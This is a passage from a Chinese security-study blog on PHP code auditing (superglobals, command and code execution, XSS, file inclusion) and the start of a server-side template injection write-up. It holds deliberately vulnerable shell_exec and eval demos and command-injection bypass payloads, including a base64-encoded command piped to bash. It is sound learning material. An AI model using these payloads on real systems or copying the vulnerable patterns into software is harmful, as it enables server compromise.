class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT&#x27;</span>] <span class="comment">#当前请求的 Accept: 头部的内容。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT_CHARSET&#x27;</span>] <span class="comment">#当前请求的 Accept-Charset: 头部的内容。例如：“iso-8859-1,*,utf-8”。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT_ENCODING&#x27;</span>] <span class="comment">#当前请求的 Accept-Encoding: 头部的内容。例如：“gzip”。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT_LANGUAGE&#x27;</span>]<span class="comment">#当前请求的 Accept-Language: 头部的内容。例如：“en”。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CONNECTION&#x27;</span>] <span class="comment">#当前请求的 Connection: 头部的内容。例如：“Keep-Alive”。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>] <span class="comment">#当前请求的 Host: 头部的内容。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27; HTTP_REFERER&#x27;</span>] <span class="comment">#链接到当前页面的前一页面的 URL 地址。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27; HTTP_USER_AGENT&#x27;</span>] <span class="comment">#当前请求的 User-Agent: 头部的内容。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTPS&#x27;</span>] — 如果通过https访问,则被设为一个非空的值(on)，否则返回off</span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] <span class="comment">#正在浏览当前页面用户的 IP 地址。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_HOST&#x27;</span>] <span class="comment">#正在浏览当前页面用户的 主机名。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_PORT&#x27;</span>] <span class="comment">#用户连接到服务器时所使用的端口。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>] <span class="comment">#当前执行 脚本的 绝对路径名。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_ADMIN&#x27;</span>] <span class="comment"># 管理员信息</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_PORT&#x27;</span>] <span class="comment">#服务器所使用的端口</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_SIGNATURE&#x27;</span>] <span class="comment">#包含服务器版本和 虚拟主机名的字符串。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_TRANSLATED&#x27;</span>] <span class="comment">#当前 脚本所在文件系统（不是文档根目录）的基本路径。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>] <span class="comment">#包含当前 脚本的路径。这在页面需要指向自己时非常有用。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>] <span class="comment">#访问此页面所需的 URI。例如，“/index.html”</span></span><br></pre></td></tr></table></figure>

<p>(3) $_REQUEST</p>
<p>用于收集HTML当中提交的数据，无论$_GET、$_POST或其他方式均可接受到，我们可以用$_REQUEST来收集表单中所提交的信息。</p>
<p>(4) $_POST</p>
<p>应用于提交表单，或复杂信息。</p>
<p>(5) $_GET</p>
<p>可用于提交表单，或提交简单信息于服务器，可在<form method="GET">处设置</form></p>
<p>(6) $_FILES</p>
<p>获取文件 </p>
<p>演示代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;heade&gt;</span><br><span class="line"></span><br><span class="line">&lt;/heade&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;global.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;fileupload&quot;</span>/&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;send file&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># $GLOBALS 引用全局作用域中可用的全部变量</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$foo</span> = <span class="string">&quot;local variable&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$foo in global scope: &#x27;</span>.<span class="variable">$GLOBALS</span>[<span class="string">&#x27;foo&#x27;</span>].<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$foo in local scope: &#x27;</span>.<span class="variable">$foo</span>.<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$foo</span> = <span class="string">&quot;globals variable&quot;</span>;</span><br><span class="line"><span class="comment">#此处可以见得，由$AGLOBALS调用的foo变量是全局变量</span></span><br><span class="line"><span class="comment">#在foo函数内直接调用的$foo变量是局部变量</span></span><br><span class="line">foo();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#利用var_dump递归的打印$_SERVER中存储的服务器信息</span></span><br><span class="line"><span class="comment">#var_dump($_SERVER);</span></span><br><span class="line"><span class="comment">#打印输出当前php文件在服务器上的根目录</span></span><br><span class="line"></span><br><span class="line">print_r(<span class="string">&#x27;PATH_TRANSLATED:&#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_TRANSLATED&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$_GET[a]:&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>].<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$_POST[b]:&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>].<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$_REQUEST[c]:&#x27;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&#x27;c&#x27;</span>].<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#$_FILES 是一个预定义数组，用来获取通过POST方式上传文件的相关信息。如果为单个文件单独上传，那么$_FILES 为二维数组；如果为多个文件上传，那么￥FILES为三维数组</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#拿到上传文件进行打印</span></span><br><span class="line">print_r(<span class="variable">$_FILES</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(1).assets/image-20211024111608484.png" alt="image-20211024111608484"></p>
<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(1).assets/image-20211024111557690.png" alt="image-20211024111557690"></p>
<h4 id="简单命令执行漏洞分析"><a href="#简单命令执行漏洞分析" class="headerlink" title="简单命令执行漏洞分析"></a>简单命令执行漏洞分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$target</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$cmd</span> = shell_exec(<span class="string">&#x27;ping &#x27;</span>.<span class="variable">$target</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="常见php命令执行函数"><a href="#常见php命令执行函数" class="headerlink" title="常见php命令执行函数"></a>常见php命令执行函数</h5><p>exec()、 system() 、popen()、passthru()、proc_open()、pcntl_exec()、shell_exec()、反引号` 实际上是使用shell_exec()函数</p>
<p>system()输出并返回最后一行shell的结果</p>
<p>exec()不输出结果，返回最后一行shell的结果，所有结果可以保存到一个返回的数组里。</p>
<p>passthru() 只调用命令，把命令的运行结果原封不动的输出到标准输出设备上</p>
<p>popen()、proc_open() 不会直接返回执行结果、而是返回一个文件指针</p>
<h5 id="漏洞利用以及绕过姿势："><a href="#漏洞利用以及绕过姿势：" class="headerlink" title="漏洞利用以及绕过姿势："></a>漏洞利用以及绕过姿势：</h5><p>各种逻辑运算符</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">| 将前者的执行结果作为参数交给后者进行执行</span><br><span class="line">|| 前面出错执行后面的 ping xxx||whoami</span><br><span class="line">&amp; 前面为真为假不影响后面命令的执行</span><br><span class="line">&amp;&amp; 前面的为假后面的不执行，前面只可为真。</span><br><span class="line">        </span><br></pre></td></tr></table></figure>

<p><strong>针对空格过滤:</strong></p>
<blockquote>
<p>$IFS绕过 </p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls$IFS-la</span><br></pre></td></tr></table></figure>

<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(1).assets/image-20211024135433323.png" alt="image-20211024135433323"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;或者&lt;&gt;绕过</span><br><span class="line">cat&gt;test.sql</span><br><span class="line">cat&lt;&gt;test.sql</span><br></pre></td></tr></table></figure>

<blockquote>
<p>php环境下(%09)</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat%09test.sql</span><br></pre></td></tr></table></figure>

<p><strong>消除后缀的影响</strong></p>
<p>例如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$target</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$cmd</span> = shell_exec(<span class="string">&#x27;ping &#x27;</span>.<span class="variable">$target</span>.<span class="string">&#x27;.com&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>执行命令时虽没有任何过滤，但会在我们输入的命令后拼接上.com，如果我们不做处理的话，执行的命令将会失去我们原来的含义，因此，我们要提前将后面的尾缀(.com)截断</p>
<blockquote>
<p>%00截断</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">wadwad|whoami%<span class="number">00</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(1).assets/image-20211024140510347.png" alt="image-20211024140510347"></p>
<blockquote>
<p>%20%23</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Wdad|ls%<span class="number">20</span>%<span class="number">23</span> <span class="comment">#也就是空格# 将后面的字符注释掉</span></span><br></pre></td></tr></table></figure>

<p><strong>黑名单绕过</strong></p>
<blockquote>
<p>拼接字符</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a=c;b=at;c=test.sql;$a<span class="variable">$b</span> <span class="variable">$c</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>编码绕过</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wad |echo &#x27;d2hvYW1p&#x27;|base64 -d |bash</span><br></pre></td></tr></table></figure>

<blockquote>
<p>单双引号</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cat test.sql</span><br><span class="line">c<span class="string">&#x27;&#x27;</span>a<span class="string">&#x27;&#x27;</span>t tes<span class="string">&quot;&quot;</span>t.sql</span><br></pre></td></tr></table></figure>

<blockquote>
<p>反斜杠利用</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cat test.sql</span><br><span class="line">c\a\t te\s\t.sql</span><br></pre></td></tr></table></figure>

<blockquote>
<p>通配符绕过黑名单限制</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一个?代表一个字符，*代表若干字符</span><br><span class="line">/bin/cat test.sql</span><br><span class="line">/bin/c?t tes?.sq? #会输出许多内容，其中包括test.sql的内容</span><br></pre></td></tr></table></figure>

<h4 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h4><h5 id="常见危险函数-assert与eval"><a href="#常见危险函数-assert与eval" class="headerlink" title="常见危险函数(assert与eval)"></a>常见危险函数(assert与eval)</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">   print_r(<span class="variable">$cmd</span>);</span><br><span class="line">   <span class="keyword">eval</span>(<span class="string">&quot;\$cmd = <span class="subst">$cmd</span>&quot;</span>);<span class="comment">//assret()函数也是一样的，这里没对用户输入做过滤</span></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;not&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="常见回调函数"><a href="#常见回调函数" class="headerlink" title="常见回调函数"></a>常见回调函数</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">常用回调函数有： </span><br><span class="line">call_user_func(evil,<span class="variable">$cmd</span>);	<span class="comment">#第一个参数是会回调函数 第二个参数视为回调函数的参数</span></span><br><span class="line">call_user_func_array(evil,<span class="keyword">array</span>(<span class="variable">$cmd</span>)); <span class="comment">#第一个参数视为回调函数 第二个参数`数组`视为回调函数的参数</span></span><br><span class="line">array_map(evil,<span class="keyword">array</span>(<span class="variable">$cmd</span>)); <span class="comment">#第一个参数视为回调函数 第二个参数`数组`视为回调函数的参数</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#call_user_func(callable $callback , mixed $Parameter，mixed $xxx)</span></span><br><span class="line"><span class="comment">#第一个参数$callback是被调用的回调函数，剩下的参数是回调函数的参数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#写一个回调函数小demo</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"><span class="variable">$Parameter</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="variable">$Parameter</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$Parameter</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">call_user_func(evil,<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(1).assets/image-20211024144125269.png" alt="image-20211024144125269"></p>
<h5 id="动态执行函数"><a href="#动态执行函数" class="headerlink" title="动态执行函数"></a>动态执行函数</h5><p>定义一个函数，将想要调用的变量名赋值给字符串，使用变量名代替函数名动态调用函数。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#需求： 写一个利用字符串来调用exec的函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Callme</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$Parameter1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$Parameter2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="variable">$Parameter1</span>(<span class="variable">$Parameter2</span>);</span><br><span class="line">&#125;</span><br><span class="line">Callme();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#利用回调函数执行命令</span><br><span class="line">call_user_func_array($_GET[&#x27;name&#x27;],array($_GET[&#x27;cmd&#x27;]));</span><br></pre></td></tr></table></figure>

<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(1).assets/image-20211024150119435.png" alt="image-20211024150119435"></p>
<h5 id="preg-relpace函数："><a href="#preg-relpace函数：" class="headerlink" title="preg_relpace函数："></a>preg_relpace函数：</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> preg_replace(</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$pattern</span>,</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$replacement</span>,</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$subject</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span>,</span><br><span class="line">    <span class="keyword">int</span> &amp;<span class="variable">$count</span> = <span class="literal">null</span></span><br><span class="line">): <span class="keyword">string</span>|<span class="keyword">array</span>|<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p>函数可根据pattern来匹配subject符合条件的部分，并且将其提花能成replacement中的字符</p>
<h4 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h4><h5 id="反射性"><a href="#反射性" class="headerlink" title="反射性"></a>反射性</h5><p>demo:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;xss&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>没有任何的过滤拦截，在GET请求输入xss代码，于页面打印并执行，形成xss漏洞。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">////获取浏览器header头user-agent信息</span></span><br><span class="line"><span class="comment">//echo $_SERVER[&#x27;HTTP_USER_AGENT&#x27;].&quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">////获取浏览器从哪个页面跳转过来的信息，Referer</span></span><br><span class="line"><span class="comment">//echo $_SERVER[&#x27;HTTP_REFERER&#x27;].&quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="variable">$xss</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;xss&#x27;</span>];</span><br><span class="line"><span class="variable">$xss</span> = preg_replace(<span class="string">&quot;/&lt;script&gt;/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$xss</span>);</span><br><span class="line"><span class="variable">$xss</span> = preg_replace(<span class="string">&quot;/&lt;\/script&gt;/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$xss</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xss</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>利用preg_replace 进行拦截，但我们可以发现，<strong>preg_replace(“/<script>/","",$xss);<strong>此处，正则匹配表达式未开启</strong>/i</strong>忽略大小写模式，并且只是单次将恶意字符替换为空，这导致我们可以通过双写、大小写、执行其他js语句等方法绕过防护并执行xss恶意代码</p>
<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(1).assets/image-20211024161516161.png" alt="image-20211024161516161"></p>
<p>存储型：</p>
<p>dom型</p>
<h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含:"></a>文件包含:</h4><p>文件包含有远程文件包含、本地文件包含之分。</p>
<p>远程文件包含需要在php.ini中设置，可在phpinfo中查看是否开启。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">allow_url_include = on </span><br><span class="line">allow_url_fopen=on</span><br></pre></td></tr></table></figure>

<p>文件包含特征函数:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(): 使用<span class="keyword">include</span>包含文件时，只有当代码执行到<span class="keyword">include</span>时才会调用被包含的文件，当被包含的文件产生错误时，只会返回错误提醒，不会停止php文件的执行</span><br><span class="line"><span class="keyword">require</span>(): 在php页面之前，<span class="keyword">require</span>会将被包含文件整个替换进本php文件，并与原php文件拼接成一个新的php文件，之后按照新的php脚本的顺序进行执行</span><br><span class="line"><span class="keyword">include_once</span>(): 包含前进行检测，若已被本页面的其他部分包含过就不再包含</span><br><span class="line"><span class="keyword">require_once</span>():当重复调用<span class="keyword">require_once</span>包含同一文件时，php只执行一次</span><br></pre></td></tr></table></figure>

<h5 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h5><p>php文件:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./phpinfo.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>被包含文件:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(1).assets/image-20211024172509362.png" alt="image-20211024172509362"></p>
<p>此处可发现，文件包含可配合文件上传等功能联合食用，即使被包含的文件并非php文件也可执行代码语句</p>
<p>若包含文件路径可控，我们可根据ssh 、apache access log 投毒进行getshell操作</p>
<h5 id="远程包含："><a href="#远程包含：" class="headerlink" title="远程包含："></a>远程包含：</h5><p>当被包含的文件在远程服务器时，便形成了远程文件包含，常见触发点，网络图片处</p>
<p>需allow_url_include = on以及allow_url_fopen=on开启</p>
<p>开启参数才可进行远程文件包含</p>
</script></strong></p>]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>SSTI模板注入学习</title>
    <url>/2021/11/12/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h2><p>根据yu22x师傅文章<a href="https://blog.csdn.net/miuzzx/article/details/110220425?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163671502616780271551002%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=163671502616780271551002&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-2-110220425.pc_v2_rank_blog_default&utm_term=ssti&spm=1018.2226.3001.4450">SSTI模板注入绕过（进阶篇）</a>复现学习。</p>
<h3 id="何为SSTI"><a href="#何为SSTI" class="headerlink" title="何为SSTI?"></a>何为SSTI?</h3><p>SSTI,服务器端模板注入</p>
<ul>
<li>当服务端接受到攻击者的输入时，将其作为Web应用模板内容的一部分</li>
<li>在进行目标编译渲染的过程中，进行了语句的拼接，执行了所插入的恶意内容从而导致信息泄露、代码执行、GetShell等问题</li>
<li>其影响范围主要取决于模版引擎的复杂性</li>
</ul>
<p>模板注入问题主要出现的框架:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Python :jinja2、mako、tornado、django</span><br><span class="line">php: smarty、twig</span><br><span class="line">java： jade、velocity</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h3 id="概念总结"><a href="#概念总结" class="headerlink" title="概念总结:"></a>概念总结:</h3><p>​    模板引擎用于将用户数据结合预先设计好的模板代码结合，生成一套属于用户自己的前端html页面，反馈给客户端浏览器于用户使用。</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112191610984.png" alt="image-20211112191610984"></p>
<p>但由于模板引擎往往会存在一些安全问题，虽说模板引擎存在沙箱隔离机制，但由于设计的不严格，同样存在沙箱逃逸技术来绕过，达到引入模块执行命令，读取文件的效果。</p>
<h4 id="页面渲染"><a href="#页面渲染" class="headerlink" title="页面渲染"></a>页面渲染</h4><ul>
<li>前端渲染（SPA，单页面使用）</li>
</ul>
<p>浏览器从服务器得到一些信息( 可能是 JSON 等各种数据交换格式所封装的数据包 , 也可能是合法的 HTML 字符串 )<br>浏览器将这些信息排列组合成人类可读的 HTML 字符串 . 然后解析为最终的 HTML 页面呈现给用户<br>整个过程都是由客户端浏览器完成的 , 因此对服务器后端的压力较小 , 仅需要传输数据即可</p>
<ul>
<li>后端渲染（SSR，服务端渲染）</li>
</ul>
<p>浏览器会直接接收到经过服务器计算并排列过的字符串，浏览器仅需要对其进行解析，呈现给用户即可，对数据的采集和渲染都由服务端完成，因此对客户端浏览器的压力较小，对服务端的压力较大。</p>
<h3 id="Flask模板"><a href="#Flask模板" class="headerlink" title="Flask模板"></a>Flask模板</h3><p><strong>环境搭建</strong></p>
<p>利用Pycharm 内置Flask框架进行学习复现</p>
<p>在左上角选择file-&gt;new project-&gt;Flask</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112192857473.png" alt="image-20211112192857473"></p>
<p>Flask框架默认服务端口为5000，运行后访问<a href="http://127.0.0.1:5000检查是否成功运行。">http://127.0.0.1:5000检查是否成功运行。</a></p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112192943030.png" alt="image-20211112192943030"></p>
<p>右上方配置run/debug模式，方便我们观察内容更新的结果，实际运行环境时不可开启DEBUG模式。（此处不知为何一直有告警产生）。</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112195457706.png" alt="image-20211112195457706"></p>
<p><strong>渲染方法</strong></p>
<p>Flask中的渲染方法分为两种:<code>render_template()</code> 和 <code>render_template_string()</code> </p>
<ul>
<li><p><code>render_template()</code>函数</p>
<p>渲染一个指定的文件，这个指定的文件就是指模板</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112195516227.png" alt="image-20211112195516227"></p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112195544031.png" alt="image-20211112195544031"></p>
</li>
</ul>
<p>根据<code>@app_route(&#39;/hello&#39;)</code>设置的路由，路径指向hello时，利用render_template函数渲染hello.html，并将结果返回给客户端浏览器</p>
<p>​    <img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112195644460.png" alt="image-20211112195644460"></p>
<ul>
<li><p><code>render_template_string()</code> 函数</p>
<p>用于渲染字符串</p>
